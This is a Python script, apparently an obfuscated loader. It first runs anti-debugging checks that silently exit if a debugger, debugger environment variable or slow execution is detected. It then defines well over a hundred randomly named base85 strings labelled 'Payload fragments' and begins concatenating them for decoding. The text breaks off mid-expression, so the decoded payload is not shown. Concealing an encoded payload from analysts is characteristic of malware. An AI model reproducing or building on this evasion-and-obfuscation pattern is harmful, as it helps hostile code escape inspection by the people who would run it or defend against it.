#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_ccOyIplWrZwtyC = '*-NC7am-~=mY<2%sGOgqvQA*rT~hZEsjDPxP5A-mj=#ekTeE#1AD>y51d{Hvyp2%BT'
_cwtleUpZria79U = ';X7NVGx7;Kn*eoWCL!~^kXT2T-^Q^l(R~A>rM%Y)e=CuuVlqj8vqrKhnuLc?&3rJwM'
_cy7rpsqmxZa5FU = '-L*uap}FEP^uhLS7C98w(UU+*EukYz9$q>i@=O<dsj+e6OkI-b2vAmWj#E-dX)Zj)w'
_ch1jIwcGjKOE8J = 'pjV5^bcVc`zy&{vgw*hK!}p*6WKe$Iw7IY#)!TQaOCvXVj8&{E0>V<+l@cBV-~{s&B'
_coPUI_5fJ8PGWU = 'A5>R8A1{x9-<d*0T>@hGol&pxUJ4t7n9~W&cBeExV@6W|i3o-hpN%r>?C03N}wc66m'
_ccdJVda9GNDIMe = 'T?TpQ-*RwV#C-2djN>r>XS>9RZ`|ZUuh`<YJAz}@i|GL=?qBBYk2;3C=w6MrKs%YZw'
_ckGD0pgcDsChwl = 'u2(pQP{w)ydV>w?u*eMKSdQ>;k93eywTcr+OOR*NsTrhc&A9BD|K2(KP$==&EJ}&4;'
_ciR2xw5KxSPEXZ = 'qQvHDKIP%8xefh$bwsq8ozOzt7BTB`wtKT)<zsD_&;ZDBn+#@_5ZOWsE``xY^dhS^<'
_cfFT_tmI5Tas_z = 'vf1us64eN#R()d1HI_JuwCdUN^8Gs=jZW4p3|ul=3hX0)hk{tx5x>6Ao0yP2N=v{CH'
_cdvboAUAnSQxal = 'egkD>`CPD4XDphl>nNpLhe$Fs(ZO6=NGg`36x4V9RGYLtsK&;Uw?T{WDJ}E4+c6H}`'
_cuDsVMBhL35R_c = 'mvWhsjR^ov(0t+ed@Hk~PD)lyZqR2lB{W8vkf~eP?A`u>Oj?FlB(CnUb1?_m6#fUVn'
_cbkup2pBZPn522 = 'k=-5vw2ePvS4BkEK63qtwq~({c~+K=B6C_FYDL*irW;5E(W~BD5cU|ldfPRS6~>Xn-'
_ciQ3koFPxQ_Mwb = ')oB6oC0y3}Z<j8d`viW5ePTQ4O5EO6}!VvsheDgXs(8k2S`aA(k-~-s`p(a@d7NGL<'
_ci1_YUaflTSC8S = 'uAR0jwR_lb2Fh)%k9h>fjQ{@)JNKZ?UsD-L6=@65vKOYT;Tz5P#Lq!YbnmpnlXL8>U'
_cpTv7aoLJXJ72N = '-Z!T0-0<x3N27@!;Ky5n*<xar60qmUsNnH+j_nvMz+x{j{MC$z45`m*C9ROkD62~z('
_czckauFHmGNheS = '*1mg$+He3#ajXTy^?otAbPh@NmR?UZn}`Ti&5iW4xnQB%;kiQvS{)T)(0=W6IirL8D'
_cvh0RMhEjPeVNK = '@;M{%$(!xdLmf7<bj6=AEz_Cw5`tL3!4IDx}vRxv|ucCGeDw67365`%AqUOBV1xZM1'
_cxbA6i_0MQA4x2 = 'l=hx<0$t%|))74Br=if)t+q7>oAc(DaGZ_FbqfIX~&OG$IL84_wECrI&_U+J#!mDym'
_cbcl6u4RB7unLX = '<+BJH;#;$IU1(e&`@gg;?1OO|DH3%NT~%7mFwV{(bG@`0QT9_UPxU2}+p4-p%KcmLa'
_ct4HOr6Uor1r9j = 'r1a?+!YkVBRNsUxNtpTBLs47ThN0%u&QZ0zdg`lyKW;dhfx_4Sp9lH+k%!<kKX!W4)'
_ctj55aNYl932xy = '%A9(jey<GTfer3M{3n5muC83n=Vlis%}53B`zFe0M`iDPitmc>Rj@%0%>OB!;qjkW-'
_ckBVHlMtpIL176 = '$l5ichRz1d_5RRof5z~Vw;mumnzd@p2rT9P0-Fv4+EMPxc~%%QIQ>kn{zu)=r+sn?D'
_cpUGQCtFhfLgDz = 'VQA*V%yxSn&Os>o&HV%;f(apqvoA6F06)klyer$g$oO*jx^QZNg<uKo0~8^@SX)qD{'
_cnglUDqDrPm15a = '0@vkw7PQ@NkbXt69nBJ5G&Tf-_VJI~vk6O)h4**oixEX#G^(h5tiJ1tKk(Nx!-P_#d'
_cmAMyJboACXca3 = 'C_wnw{M9W9X5WNrS%q&v707s#>IT+psEII`L2mo0QakeWD%4kpKKG8@QxdM`ZY1^j2'
_cr0bMqGtLJbp9O = '3Si6V67ojc-8llRXx*QOK>?W%O6Ch=<a4Q(Y7@q6LR5CVLSl(mPWi2|12@d94->?}b'
_ces1JR5H9NviTP = '?}2*qRC`K$<e77gvnFWY@9TO8t4Htd|>l}ua@xb$NT2GF2EYD&+*Ck9Ou(Z7rgys7D'
_cnwUPYuHguSTKX = 'e6mTou}zypGPzwnwKbrpKA`NVL+%*?w0JZEGUcCfq<EKAi%1y*wNG${!150UkJKPt{'
_ccbIcsayBTA8Br = 'v36KaZjZy52=Ga<=`l@EcK|K<Rk0uK3+(f=W1E3@Zrp(tH0an5UktNtW94a?q<Upj&'
_cwJmY3ZWpmp9AT = '_u+V(VUa=P3KcVXaf6BMcCpWKOncDI9MYc=HBQ$B-;@=+<Of*ouFsvQEvwS~t-ia>7'
_cwYpaStCDuLhg5 = ';;nb@3=OyKnJ@#e(ak@Y$7@;JWExZ93%OKv_gnNKw2rHCaP1fyT}2(GDlEkcue%}II'
_cbsbgSkAWftNd4 = 'MC$_yKguscEs?T0D{Inzxw!WIN-zcjH*$`%8t;k;yRlU(ag%w1`M_BuXBOB%7eQBzD'
_cpDJgXmxj8sQyj = 'm^esI`>Pyp%_g?h?w|(g`;}(+5L)NTF_@us<rTMDu4Oe-<LKq0^}Iiqa-)$D;dfaM6'
_cf_EkFTFGtQAOs = 'j06vn6KTTQI@f!F0lkZu^%g?-f-W^B&rhmMYhW1QC+PNGE_0jgccj4H9$?WE_GsYNi'
_cgeECPSSmgdPBn = 'Xm<xIo_BQt>yk9J3!@x)VE{{Aj6a8B0bs?dT^cfG^!>N5DbhYn+q`<I$-z-B97}=Co'
_cbamQqBR2WbpPK = 'qz(i@Jh;rz!;T;4Z{KiQO=MPz{9mr<ZfaO`1!UCwlK5K|pY$UtL%bz0%|+}Yekt&KS'
_chlHd7wtQ6YodB = '!ytd|Gx1|#vo-~<H8Rgs;LAguSr$~mHIn3KhYw5nY|)%zXGbvselg+p&&<}Iq(`oY2'
_ctolGBDOh9_kKs = 'F7lRkcov*n;e-vr;0~X+Zr8_j5{z6$tPoL}MIVQCEE}vze6svvd!Q2ATIMQH`!9^~y'
_cz_E7t2NHieCKD = 'zOseD5g(6HOv{uDuLxabP~tzrX!=vmd`J1ebGK|~cBj-u`xDtK7*T$0o1(<K3#J5F5'
_cfDGvPq7k1vKVB = 'm%|_I}h_5QAe^P&2Ar0TiMVc^7o5T(d!qBB}Ei>aMkE*{=Q<g9K0)sviT01f(F&xTT'
_cnm4Q2lLOqbt7o = '@r?R=jGpAUk#9RCih%}D#U)Sm`s&qys8fJ!zEMniu_Tb6GXj_jF(~_eBC&T?Kzv3IV'
_cs_c776O6GkSKk = 'gP_Er_^+nRXcF7w|F=mCc4#MJ(k@;Bdj0LCQ`hw8tbLAoh~Q55%;|#5;s$xN%gmSbi'
_cjQv7ZPkbkyKuT = 'QZ?ldFl)HRHHc>Tymv%2%`GN)n#klonvzZ#m)`tTy+{z?{1?^HSeMU6pD^?Xo(OTh7'
_cf_S2Q7ag8VrQd = '<&5XZtdb{W=mvgY9T^J*f-YS7rf!!Db^310YWTpp=fKJG5aH4NKv<8&iS%+k*mJIuw'
_ca6icw3BD9jOTh = 'U>dHY${c=(~MUJK_`d=wM%zD*QWlCu3Y27H{M@`9AVE+0e@Nlqs*Zjo896%lX6GC+<'
_cwtszN8tw1rxwo = 'iiOhB4)T^y5~q29cF~k+c)UX48af#woe>@5a{^PQreA1#IkaNfGU_(^%uuD1j(B4D1'
_ck2qGmmvJASYjI = 'c6}wcDvHONPT`NZ)&Dfp9?_{h|MIsAvLK@L9n@pKF|REyE}Ko9u3PV9Tf0i^!`k)T3'
_cxvcLRnlyaaPIC = '(+|q?A6;x{rNPG8-Aab8;fu_W&8aAN3(@K&tG>)Y*a@KnSEa=<uAOq$~irYA?gOtJH'
_ckPR2SHf_41lOB = 'uBXHC;c{3<@{6tXfo;``P@J?doS*4yPp^-Zrkx;~wX2hZ*2<Lw}JwgBOsLw*vpPf4R'
_cqtPgRVEaVNYI2 = 'Zf68)_yD3z;BWSirl|06}e*9mxm%Py`Q7K&Z4CY(;=yw6#>0}c@LA3yBEgq-5LMmV7'
_cr9wSE4DXCh3Pq = '?Jdyt-IGqqHLXtUBxveCbM<UgL(r|@%Qih<b<%~R{ZH6w(rY{*m_;$i?fPLbl<r3e6'
_cswdkAvb_Iuy4A = 'AybGEPFITgDp`!{>u~>i1b}$U{3#v{+C4n_8Lfx>bxJ0O)<wSoR1ML`?7pbQ!rmwv^'
_clvcQraDX_mjqW = 'K?Tct8jI^TVl*78aVNt4&@p!SDnB8^iQf4P~zNopJtUWsPl<_oPaAhW@vVSLb9eMgM'
_cxtUQ0taAFqYQL = 'h%TuuUAHCR7(6-<v^C>kCH0b;{o6d<YR!&j9|B^yf8qN%guM5}|N(u;^esGB~0-Fab'
_cmoKUCW3l4ZcqK = '5i^ZXtx&4^p{%UASeLG%sA>L>EVhd}##KBq2gUHT!NEOTGn`04GaKXF@s{NQ(iI*Q4'
_cccwCgozFGj9QM = '5n*!(ZOdo*#?TcLZ_}}zg$;x-h#BS%wKfoA)1O(Blviv9m?S)4O9jD(44%+(a<-5EQ'
_chKkoH8aPThljK = 'Obf|)S{q+dOZ5J<Ra0?N+Pf?^5P2N5k}`D|9U!f8rVtSgq!It4quT3SkKp6hK%jiOa'
_cyKQe030NSGxdO = 'UBuX1^WYVCUT&Ir#2JuSe+W=1Zsx@sg-6GQm@Tq@qwBliMeMOG2CeK8)=uR?u*QweC'
_cq5BSQgltJifoQ = 'PrX9cN9KKe6r!wJ(Q${0J)6cj_;gueYev2fZ%3D9bD#;=}eB2V)ep^wGMtR>YcuI}j'
_cf9Adw5OQGryCJ = 'y6e0AtG=Y^dyA%^0m(o&D@;?_rw^SSrP0LTh<ecuPlRC!-6!Q?`z=t@zQmQI_+O_g`'
_ckWRk1P3_qoV5j = '-(M%3)F&cXX;(T>$noK7Av7!@wsI$9v23+$)I5#+Dq}p?A$?LxDB+a7qtE-o^W(P1&'
_cedox6wPl8_IV7 = 'VT^uo6bviocs38880B&cqj^uURXa&HTidpr~s6DrIB%=&@F8y9~T}B!d;bOESUM#ol'
_crnXQoGpw7RfEH = 'Xub%X){B1t<#^aY8J!g#Jl2BCdhev{wsg<;McpOgS4%+uaOGbT|AL%D|%gR)+%WQaw'
_ckZPHGOH5KMC5R = 's{3%{G=$~%e2Wu;r&W)mywm*9OYGk2N{W_i~gPy#8aOv-!c0uu2ah1KmzVPu0WrWv>'
_ctgDvvDmQkAWzi = '&a^|d^_V;ks1;I7C2W`jnqw&pEK;z7v9ft&Z#7gSu6i;%JX3pTy^bxUKx@z9vADc*-'
_cq2IzDjSDerbS_ = 'Yj6el3f%Jam}O9get<|vXT5qEN2UpM;<cZ5Ma^eUXmcSd!@k!ySGG_%m`F=p3;xT1@'
_cwscmBaowayvks = 'W$<<5>*;QY5FmSA3emdDSpI$r^vK&VdKQ>Q%aA~23^iH;Y>Q=d=l$-dvD3%V%00rM1'
_clBqNxcD5KCjuS = 'k-s)*D}IrbFbB11*0t8e%fZfna;wl7wjevi#Njo~EiW|E<4Gz$aHwJ+DW$kGgawGv!'
_ceX0QfA9_CTaUJ = 'DDQYA(py6-XGiu?TeL*vd0aGhrqcN@Uw5c==KeUbBi%^t%-h`F|}{fMvb+sslD;qB|'
_ckNIjY1qG_0iCB = '+_hob7%R3Ndx?V}KOEa*+2K)XERg)`dYo<*HrR<Ctx9U{Eqm-gQ5PPK-uw~@$q&f|v'
_cyfMQkGQ53I5Ds = 'LF&6V?%BGC<(tWH;;k*P&I-31M&Uu;lH(+zG4`RY%2{FS;P)})B4#{s^b#^Hd{=>qJ'
_cclw_OdwKLBEud = 'g0*SJ`IE^*6G{IG7ItTVn6&6!N2N+-~{u}4C5?j1DhIpDFM?#*p958D$DLqk~jfK`&'
_csipIJJ8oXptap = 't%*#&8RR1^GZxEg$({2Yl5-QG8cQb<Js-BOg$lBEtdPK%i&^C~=Xf!RQjkQpT|vHOv'
_cbvP2lJNBqB9gC = '}vzJN#+0GRXcg337Z5tmX7JiK~o8FiAkp{nS*fwl%OrLVa1Mw<(tKT9O21xzfKfqHj'
_cruNoHyCzSNwzF = 'J5k-uzHw#0W`#_Fy=*L@DH(6iJwk$Kz5Id`HFMj!KfKbZ@^@-L)%b^P;^@d$-s^kND'
_cadCrLotPLLgXn = 'btfIiP6ycp8h*$-nYdFA0v>6c$2w8Lg-QHv+$o#+4-Ma5oaDe3Y)kiZGayLEK@=U4p'
_ciPCwiyxcJEnd8 = '!S+4RsyQ3frnqD(mFdvqBj;eL1hYTa<*hh-Xrmyl&)?-a(XxgL9011X2?f<7AQ$kT5'
_cx3Ccmt0aHiJIH = '>tMy~8>b1%+fcD*XOBiM&ix{6F8HvK~&tpKQNR_~dbI%6a!TODJu*ek2t$s6iP-s6M'
_ccU2CgV1p7Vqwy = 'rP7Dm#k+jK)Q1j7IdMz1Yw%N96_+Alv~(*7-ahRtNS|01fcO1a8EDYlXkWX73vO*Fz'
_ckSWp6VC3C018A = '-Qz6($K3-E?t5r7vR>I``=Y)dOWa7x!8svpp68u%3<KBkxc22>~J!8K}Y&_sMgL{>B'
_cq2ML7qMaUzNQ8 = 'lkR&aAR&>(%7iQ-m@ci1qXJ;6R09Hs4G*PRLSkLdFUum+rx?WiWx2aJiMlR(z1uu<='
_ct9V_Wwa7jHOMo = 'yD|Td>^>N5~}{EF_v&7I*Z|$zsdj<AJ3_upeNZUF$N;3wJAW}S>l6&k=b7=m);|abL'
_cyYDRO0XsQa9dx = 'fQhk7W`w>%pJUbT66#w{<?v0xVmt(!%`cHD*c)gk_)A!FYCh$_Wxhtd>(CH9F1&d^p'
_ch5hfSy_9UuXXs = '0${u)5l&0fgU7S9wdm`28rhBtvXeN_|*&)Ebe2Ay8bTcU@paIwK-YDmIVzn+wA=$MZ'
_coChK_vlI19wvy = '0?G@+e4RCM72tgJ3Zf$)`!!$#IY%8p@K;WL3slmdCdTrX-GU5)2Zh(@N{x?t>QGeiE'
_ctMFmkwXQBUQiT = ';zkl1-B~SC>r_XDqKB%aBSHlGkY@=`Xq!=ToQZj6IemSMiutgn+9ln;z&@FXOio;2-'
_canYKCqieLoZym = 'pL@y5?~MG^T~UC(Wo=4x%?1?0?k&v6h>!YR(@;jxQ>|n<sqx8AK-jzwr;(+(Hr1Ob0'
_c_RQDvYAkUKUnU = '?mu?PtIs>Ypqk(>m^WYO+-buGbb7LxREHWpP)_rx4%%%fAK_^y6Z4@tP7UA~p7rOcS'
_cb9TwpLFcqX0pV = 'j+fI+~hN~UCwXNE@``LA^mtg17M=Km|mqTF@Il#$=v-y{wuz&;VM)-a!#f}Y1XFFYN'
_crIX1dzkBJ6tnh = 'wa(BYqOr5#$b9AAt26|?W{@j(ZF-(JVdE?)KbsxKK+;w;ax$7idNj4kFiCmj(r4mup'
_cseK5VURZdr_tg = 'NDCOu8w5<rptl7%VQADs`|kDnyu!VRh3x5zUDwN%@T;O&f1e-nVz!vwe-d|hXDa4;K'
_cbXNZh1mNSUEgU = 'k;8g0KA)aBl$c|GF&vn0S8%(0x*ShuLRxL_*TaW<*d#wE*51W`Uz3NG~^~6w3=B0ii'
_cpGdFwxNCiOAHC = 'a8(jL}?=8woIjhgfS99i)75SA>6j^w%LDa^fo|n?w-OKa;;7_B>JFDL-Et2g<WnR;U'
_cgZnG0ijkqvkgo = 'Kfc@&azQ_KH7*9X(h5ZVrI*Rzv2kkZFZiTM#E?0(yGY{*7Cvy(WR#b+d5E{<AOJKy5'
_cldWuQeJxUiOZS = 'MBNVx!PDFz5kY*q$Ie`S3i@p=15I~!wo2pTH^YeS7&K6d}WWKP$W^*+AP^-)ZB`T!s'
_ce4O110hLmVtYz = 'cl%aVHm%1VvTx<JaAmLhtmm$*Ti(mFuC~&R79KL0eR+FlZfqY&g=FQ}l1~&e;4>)E<'
_cfAe1AZm8sSbS1 = 'aW(W#e3yKKTpZ?lUKd5z)xHvs~c@vuTD^NgN~GJ{Zni->BnwYBmw_1a0QX{3j<R#{N'
_ccXEzKsJpDjVGe = '!5$STNJTw@vDpHAz`ZxtokH7}!#<d+VE*t@m?rau@@T(UKOquqUU=WB^zLry6_0^?p'
_cjYMLNmw1FYgWL = '9kUBba$v?ju}|FWk9-&@SZ#uf6S)8vVDneLI2F4b}i>s|Pvc4jj&!*&JUY~1~qp3#u'
_cuqUPSPZ0Hxgtt = 'KarK%Qn=M5Cnwsy!)5fT}SBpc?n9TCR%v>SeaU+geX@OtkZA1ciM}O$Euu)(D?Fnr3'
_crMTswMBL9APRF = '+uN?0`cD3Yq%p?+pm}*ZD*GqOJKMUB`{NNWnb%_{F%DZJ*UrpG?GB%DqKGgIh7d9aL'
_cfz3pSbkr2vqR5 = ')|Y@K<d_!w_;bzJ-26}?;uAOcAa*sbVpg0kozGL7K0R}h9}6j_2<R;vYE<wkCMt{jh'
_chJDCRxhckXXZk = 'ybbV-e~zyRZz7XkDDXePd*`#*8;61ishId9h=FbyE2zOTqG(|Aw)l;O*Itr$AO}7k8'
_ca7LKtGfxAmXEE = '%;W}W;b`O$w*A8(Ljbc|WiJRJvCGZfXkCqB^5`tQ1k1k2|ISR3S3BoMf@vB={4QgVR'
_cl7DroXyZjGbK1 = 'cC0_B^s<X*d#4ZwWPjwBreE_UImlik2!x4Sr{%fJT?8HK4KJd^stq>p`71eUnfBZV='
_cowsA9SnvjIc7g = 'wgwK8r_z!S`h8UFD<(VicB$#U)4T>E)R+?{>odRSs4ebOKI$^IB!Xfxdzwfiir-d&N'
_criNusI977GLxN = '5*emCRicW?MG(&A0)})u7^-He0en1hwjCUx!vBZ#=|&!))Rs7<&=!j#?P@Z&0Z+GH#'
_cseDS6yDNczZWe = 'G4Pzlh^!Ru6&x!Oh!gRld|zE`6iO0a0kl!7a_PRYqzu3J$ZRvReX`?$Uo8h%c?Kmz^'
_clLh9AK9MycqT0 = 's79G$4B+iC7kTB*(fDyY<l@dUlb%XNDY_$<>eIW$0MXR}+X<edc|-O1W5?ZU*$F!@G'
_ct_RolM3JUIsEd = '80M^Z9pheq>*gwOnw!<fuI`M`mZAW)Nm>kTW)A&oFtokH*S)C()5!UNo!#!0%?egMQ'
_ciyy3tZqBeaPKS = 'BMBE`>@|7;o~x@~VXIZV(gtjt;M(JRDobH26mk5v|8H)ORMEWa{tUk^z&)+rSr&k*h'
_cmtAfNVsyqRvdu = 'x984_!7s*!|tH=r1DF)1}rq(7|k?AsD-J~;mRpcq?KU(;fEMp`^*KZy1P@iq7Ed-`8'
_cpiRhz9U6sEyWo = '9qA?{)$s)X5c_kVnb-P3uY3Yh&Kj9fB>z`C%OGjp|$PgWo|*t4~V%j+oa_Tz?{zRhR'
_co0RFAp094GY1c = 'SceM&9q8mRy|3wN%(9TJjuBTdo4HqA=>Wv@W(wFSe!g!?`jDFoZ9Pje+&6NtON%F_|'
_ci6NBBF2vyH9tD = 'GN(0YfC=7FfNEI}~%W8#=Y)F}ZtzKnJDc4r#MAhw8NRp>^_>gNH82>b!OwG*A=r)mx'
_cvm65va16Re2ZK = ';x7(!NG{*crRFxl)c&FXhlO85Z3L8o`iLts66yF3;FV(R8Jw>5`%O{P3|4b4{AjWCI'
_cb9Lz9PZfFbhgv = 'dhx)<4eCfJ_B<9Wi@Ml`lN84x^%*~4c+IMh|ivS!5d%NU|_8Suf9W$(qXMX>v?V!(c'
_ckveiQEhMdSx5V = 'GK>De|zh9y}(!SwcjbRojW<TMu|-6Y&7+p)ci`^)s8y!)ZLz?4_!egZ1nru>0k=Rtu'
_czvqQDrF34XqTt = 'FYGV2`zqs+QYVV|=|R{1}F)r%=TpMHR2I0a7%#y8j~K=i$z%)j>t56nt{<)ASRDL#Z'
_cwNXiPgixDuebk = '}0TjZLbE;(g)WRg($>XJggII;8B@UPP8-JI^78T(nwC~JQ>myh_{w{5f(4%uY1P&*Q'
_cqgMO72YMFje4c = 'ldUaY7@IWtO8pjNqrln<Z9v~oXD2|uWvRq}R0Xi*rrkO0iVUZ(9X`W;@|r|@EjSCEz'
_cj2saNC11zyYgD = 'KZ&X5g;0SpyNF7t5te{b>J{blqg4pqjW0rA6yDbC9h9tg4#Tl0*7Lp5_0eSS>_SyGb'
_cyWDQdSRDRNwmX = 'rdpJE4jAMD%`wePP3q0=2Y<U`8+oJ@7ADRDsi`qD2PCt*zmmCR<e`P=dxYBDe4BkQ4'
_cphE5g2WCRPFDR = 'eXvTY41<9AyJQte|Z%xje!3$XN%KZ&>*PUM_3>uP7#xr$6oHFE7mH92z|It*Db0I$V'
_cpS_FKGrWMz4t0 = '2;-TS6a*lts4qTr<=@;4>?;1;jw|kGStQ_Bb%p!?rsdMjJF<;?Ho@<ky?fyl1pv5!<'
_czSV8TcNrbgvvi = '&?sP(dGs5PrmR6MuDlNDTp63gnHw7%0$fwSplgY}ed9bXt8>+WGDerA0n?C#kRH90('
_cr_N5Ac85D6Lek = '*f6(iRN7ZeMO#Xv(;Oqjut31d|n3Iy3@mR$MRqDN487&wjRmuF4yVHCx|kQoMxwS0V'
_cox6nUoqm5O_Xr = '>xpE_6nr1_2OmGU7y7f348W6ei?b*ifY9)(LAxjJ;HyKWhccI^Z5WMt{9*6txMa6c<'
_ck0Pw8XWZsxEDc = '1*_ZkG}J2SKpq9A^+-anuc<ZOcvqb5I&_E_IlaJG0lnHgGCIHKm?tSaWQnZO_gjEi`'
_ceebT6TgOXAPoG = 'b1uZ^F9^x=+>-mHd+PK62r-n5RVwFgqnbb#yb2gWng;U=EZH!w?IV}hz>$DuOo;5~-'
_cihuFf84wIKqqv = 'c1kF_&=2^BE<l+Jnc*9jYXRmp=Z<TFpVWneb2e8+hc=U{eynYJ*dqvGo8Otx6Wxs^H'
_cq_5EsuTozepTK = 'D)8!aD$PgBRk6Z9N-F;QtdvzwjS={n<$VWw_oZRkKl{E@c32Zy1^JVJl)IsBI+zr&S'
_cfnKdSJHBkGvUa = 'YpvDZwSXyt=`r!s+M^1DQ>`GVSc*n;^SE(zC64A69=rec0Oy(jewX{Er#u-h6yQMm$'
_cataIwlc1RsSXk = '~XLdp`yW}^*_rpa%N0-3PAvVHC1o7kcW;9vT8uWGV@bwzx0<q>Q5PceS3l20w9cWSp'
_cqvpdrW4rMrRNG = 'a8bGKp4cWEZ9<wD_qmuV4_C0j&n-$fa?LWg<(#!gKR}7ub$Sqh@!PA}Wm*7+04^X~q'
_cmiEQ5335exf0T = '=k_#@oob8FCwvj&UjT0laDS<NKwgZ?B$jkr6P?)Av*qHt{$Tb1lW>tKp@@3?-0S;y`'
_cdsrB1inWDLszW = '&B3A`fF{Bt$s5z*i#wiT!Uu`;-%p}mL-JxIWITr1DzBslggDtb@(LvCT%oG>glKiKO'
_chuEoFHRuMcltc = '2w#IWQ&SW1n^D#2OSAwx2(o*N*+@Wcq|*jogN)h^sW2r*`_1e&H$MRr=(IKU~s)xw#'
_c_TdAXhjqVXtME = '=IW_VqS6aAPn`HV1j%O&UsKqbH0k$8{i`^MlbiibtCJic-07>QXV(V%GsAE9>Rf&1u'
_cbTnGLj2Jx6DM_ = '9aR~g^^SM+%hc=dnX5zRReTFXWswj{SMOuRuhB#s$)RDSq@W8zw74on3h3zai2$XP<'
_cp59on44UvcAK0 = '-2ZuULj6G|E?TIsVRvB&W?NpBB4a=8LWMOOOke3uU)huV&X<us|CXb}aUov$X1B$gq'
_cmjIOUvfVi_bH7 = 'w!Y*r=1lovwpSUwMg&s!^%;BED^SFsNtkJbl?Nw13?H^jcI#v$W2e*d3)jX8Di#tOd'
_cz0yVNzw3vtp9k = 'l%UM#9Aaht+h}05`fB57OoeZ7pGn2qK{0mKGFH67siVid@L>)dh1zd)xnej<mSD-!>'
_cmEUHqGLMP9wwp = '-_&$HO2UxnA0Uf!nphb~V1-cmz;eI={(JduaFj>X()5*vqYJ*idWEn4Wm2Ps*+hfeR'
_cfhNYZT8QEezeE = 'Pt(fn9S0ix|VV5<RmsOF`^TopkTjo&bvQD|8O?G8~{OBoq5&vCIwZIt-YxH1>WCE8F'
_chuUUWt70ABeJc = '!&=^_>=VDJ*ZGLU5&bi})h5{%N=61QIlca5;a{{c@_61J7K);4E4ll3Z(p!#!RCGQ_'
_cunK4ZIkf7rVRt = '>R6+oXiKWMir`FgT1n7pG+G6yDrqd`7JVT&|jc3?tvZJI&WZ2`!te*G*B`7e@(YU9m'
_cnw_h9dHWYcgt_ = '{0Ad8aotMh66?oTs{xBf}9Atcc^>wO14IYD!otRUL-gM%3N2pMlP2M;iutpkdLGQ`)'
_c_FUQoIiSYKgNs = 'uLVR~|%eV|!#WiboRSrKMcy<{#22oqmTU_uyLfzSBcn9Zqp&FL811Z*l~E}PL9m<kn'
_ciDY34GaLnB9XO = '&1wSncX4<26Mq%A-o$yp{@RH(AD=CggG-_}i^(aO??;+G;Ds7goM{5R@0`-GfwX0#@'
_cnV8Rnp05BR7_l = 'bW3(Lb}bi`dtbkJe`~RZ`5<ux_a7&zeq?BH>8)Y)9T+HJIKvgmYTx@tC|ytxDWxkKl'
_cbUVNJd0DTD3T0 = 'hQJv8gw#tyDBU`zJ84e*DZvq>EE-#gTeY`Nhm-rKKJk3b842i{f#J2d#dfnVD9EYYt'
_ctnMpw4Ai1C3ZJ = 'aDaXj{|3LE1o^Mt@E67`rQogHsD0i`<<(KsO|Nm(N-pT~szuuZ>LTTaxij+*(%K5+j'
_cq2zQJ43L6sEG5 = '8;C^W0sgN#{PhG++sM1q-?X#m!ytp'

_pwrED1nlIxxlvg = __import__('base64').b85decode(_ccOyIplWrZwtyC + _cwtleUpZria79U + _cy7rpsqmxZa5FU + _ch1jIwcGjKOE8J + _coPUI_5fJ8PGWU + _ccdJVda9GNDIMe + _ckGD0pgcDsChwl + _ciR2xw5KxSPEXZ + _cfFT_tmI5Tas_z + _cdvboAUAnSQxal + _cuDsVMBhL35R_c + _cbkup2pBZPn522 + _ciQ3koFPxQ_Mwb + _ci1_YUaflTSC8S + _cpTv7aoLJXJ72N + _czckauFHmGNheS + _cvh0RMhEjPeVNK + _cxbA6i_0MQA4x2 + _cbcl6u4RB7unLX + _ct4HOr6Uor1r9j + _ctj55aNYl932xy + _ckBVHlMtpIL176 + _cpUGQCtFhfLgDz + _cnglUDqDrPm15a + _cmAMyJboACXca3 + _cr0bMqGtLJbp9O + _ces1JR5H9NviTP + _cnwUPYuHguSTKX + _ccbIcsayBTA8Br + _cwJmY3ZWpmp9AT + _cwYpaStCDuLhg5 + _cbsbgSkAWftNd4 + _cpDJgXmxj8sQyj + _cf_EkFTFGtQAOs + _cgeECPSSmgdPBn + _cbamQqBR2WbpPK + _chlHd7wtQ6YodB + _ctolGBDOh9_kKs + _cz_E7t2NHieCKD + _cfDGvPq7k1vKVB + _cnm4Q2lLOqbt7o + _cs_c776O6GkSKk + _cjQv7ZPkbkyKuT + _cf_S2Q7ag8VrQd + _ca6icw3BD9jOTh + _cwtszN8tw1rxwo + _ck2qGmmvJASYjI + _cxvcLRnlyaaPIC + _ckPR2SHf_41lOB + _cqtPgRVEaVNYI2 + _cr9wSE4DXCh3Pq + _cswdkAvb_Iuy4A + _clvcQraDX_mjqW + _cxtUQ0taAFqYQL + _cmoKUCW3l4ZcqK + _cccwCgozFGj9QM + _chKkoH8aPThljK + _cyKQe030NSGxdO + _cq5BSQgltJifoQ + _cf9Adw5OQGryCJ + _ckWRk1P3_qoV5j + _cedox6wPl8_IV7 + _crnXQoGpw7RfEH + _ckZPHGOH5KMC5R + _ctgDvvDmQkAWzi + _cq2IzDjSDerbS_ + _cwscmBaowayvks + _clBqNxcD5KCjuS + _ceX0QfA9_CTaUJ + _ckNIjY1qG_0iCB + _cyfMQkGQ53I5Ds + _cclw_OdwKLBEud + _csipIJJ8oXptap + _cbvP2lJNBqB9gC + _cruNoHyCzSNwzF + _cadCrLotPLLgXn + _ciPCwiyxcJEnd8 + _cx3Ccmt0aHiJIH + _ccU2CgV1p7Vqwy + _ckSWp6VC3C018A + _cq2ML7qMaUzNQ8 + _ct9V_Wwa7jHOMo + _cyYDRO0XsQa9dx + _ch5hfSy_9UuXXs + _coChK_vlI19wvy + _ctMFmkwXQBUQiT + _canYKCqieLoZym + _c_RQDvYAkUKUnU + _cb9TwpLFcqX0pV + _crIX1dzkBJ6tnh + 